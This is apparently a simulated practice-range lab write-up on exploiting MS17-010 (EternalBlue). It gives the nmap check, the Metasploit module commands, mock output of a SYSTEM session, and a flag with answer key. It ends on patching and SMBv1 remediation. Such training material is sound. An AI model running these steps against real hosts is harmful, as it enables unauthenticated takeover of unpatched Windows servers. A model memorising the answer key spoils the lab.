# Lab 05 — EternalBlue (MS17-010): Identify, Exploit, Report

**Category:** Exploitation / SMB
**Target:** `10.10.10.12` (files01, Windows Server 2008 R2)
**Environment:** TechBiz Security Academy — simulated practice range (exploit fully simulated, no real host contacted)

## Objectives
- Confirm MS17-010 with an nmap script scan
- Run the module check before firing
- Run the simulated exploit and get a session
- Confirm the privilege level landed with
- Read the proof file on the target
- Record the remediation

## Methodology

### 1. Confirm the vulnerability
```bash
nmap --script smb-vuln-ms17-010 -p445 10.10.10.12
```
```
| smb-vuln-ms17-010:
|   VULNERABLE:
|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
|   State: VULNERABLE
|   IDs: CVE:CVE-2017-0143 CVE:CVE-2017-0144 CVE:CVE-2017-0145
|   Risk factor: HIGH
```

### 2. Load the module and check before firing
```
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS 10.10.10.12
check
```
```
[+] 10.10.10.12:445 - Host is likely VULNERABLE to MS17-010!
```
Running `check` before `exploit` is standard practice — firing a memory-corruption exploit blind risks crashing the target and destroying the very access being sought.

### 3. Run the exploit
```
exploit
```
```
[+] ETERNALBLUE overwrite completed successfully (0xC000000D)!
[*] Meterpreter session 1 opened
```

### 4. Confirm privilege level
```
whoami
```
```
Server username: NT AUTHORITY\SYSTEM
```
EternalBlue achieves kernel-level code execution via the SMBv1 buffer overflow, landing directly at `SYSTEM` — the highest privilege level on the host — with zero credentials used.

### 5. Read the proof file
```
ls
cat proof.txt
```
```
files01 - Administrator desktop
TBS{ms17_010_system_shell}
```

### 6. Record remediation
```
remediation
```

## Answers
| Q | Question | Answer |
|---|---|---|
| q1 | CVE most associated with EternalBlue | `CVE-2017-0144` |
| q2 | SMB protocol version affected | `SMBv1` |
| q3 | Account landed as after exploitation | `SYSTEM` |
| q4 | Single most effective remediation | `patch` |
| q5 | Flag | `TBS{ms17_010_system_shell}` |

## Takeaways
- MS17-010 (EternalBlue) is one of the most consequential vulnerabilities in modern history — it enabled WannaCry and NotPetya — precisely because it grants unauthenticated, pre-auth SYSTEM-level RCE over a protocol (SMBv1) still enabled by default on legacy Windows builds.
- `check` before `exploit` is a non-negotiable habit in real engagements: memory-corruption exploits can crash services or entire hosts if fired without verification.
- Remediation is straightforward and highly effective: patch (MS17-010), and disable SMBv1 entirely wherever it isn't a hard dependency — it should not be running on any modern network.
